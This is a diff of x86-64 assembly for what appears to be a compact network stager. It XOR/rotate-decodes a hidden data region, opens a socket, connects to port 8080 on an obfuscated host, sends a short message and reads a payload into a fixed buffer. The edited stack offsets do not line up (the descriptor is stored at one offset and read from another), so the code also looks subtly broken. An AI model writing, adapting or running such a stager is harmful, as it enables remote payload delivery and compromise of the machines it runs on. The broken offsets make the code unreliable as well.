@@ -3,25 +3,18 @@
 	.globl _start
 
 _start:
-	addq	$0xffffffffffffffd0,%rsp
-	movl	$0xa,%eax
-	movl	$0x401000,%edi
-	movl	$0x1000,%esi
-	movl	$0x7,%edx
-	syscall
-	xorl	%ecx,%ecx
+	addq	$0xffffffffffffffe0,%rsp
+	movq	$0x401078,%r8
 	jmp	.L0
 .L1:
-	movq	$0x401078,%r8
-	addq	%rcx,%r8
 	movb	(%r8),%r9b
 	rolb	$4,%r9b
 	xorb	$0x42,%r9b
 	movb	%r9b,(%r8)
-	addl	$1,%ecx
+	addq	$1,%r8
 .L0:
-	cmpl	$0x28,%ecx
-	jl	.L1
+	cmpb	$0,(%r8)
+	jne	.L1
 	movl	$0x29,%eax
 	movl	$0x2,%edi
 	movl	$0x1,%esi
@@ -29,15 +22,15 @@ _start:
 	syscall
 	test	%eax,%eax
 	je	.L2
-	movl	%eax,0x28(%rsp)
+	movl	%eax,0x18(%rsp)
 	xorq	%rax,%rax
-	movq	%rax,0x10(%rsp)
-	movq	%rax,0x18(%rsp)
-	movw	$0x2,0x10(%rsp)
-	movw	$0x901f,0x12(%rsp)
+	pushq	%rax
+	pushq	%rax
+	movw	$0x2,(%rsp)
+	movw	$0x901f,0x2(%rsp)
 	movl	$0x2a,%eax
 	movl	0x28(%rsp),%edi
-	leaq	0x10(%rsp),%rsi
+	leaq	(%rsp),%rsi
 	movl	$0x10,%edx
 	syscall
 	cmpl	$0xffffffff,%eax
@@ -49,19 +42,19 @@ _start:
 	syscall
 	cmpl	$0x28,%eax
 	jne	.L2
-	movl	$0x7d,0x8(%rsp)
-	movq	$0x401a00,(%rsp)
+	movl	$0x7d,0x18(%rsp)
+	movq	$0x401a00,0x10(%rsp)
 .L4:
 	xorl	%eax,%eax
 	movl	0x28(%rsp),%edi
-	movq	(%rsp),%rsi
-	movl	0x8(%rsp),%edx
+	movq	0x10(%rsp),%rsi
+	movl	0x18(%rsp),%edx
 	syscall
-	addl	%eax,(%rsp)
-	subl	%eax,0x8(%rsp)
+	addl	%eax,0x10(%rsp)
+	subl	%eax,0x18(%rsp)
 	test	%eax,%eax
 	jle 	.L3
-	cmpl	$0,0x8(%rsp)
+	cmpl	$0,0x18(%rsp)
 	jg	.L4
 .L3:
 	movl	$0x3,%eax
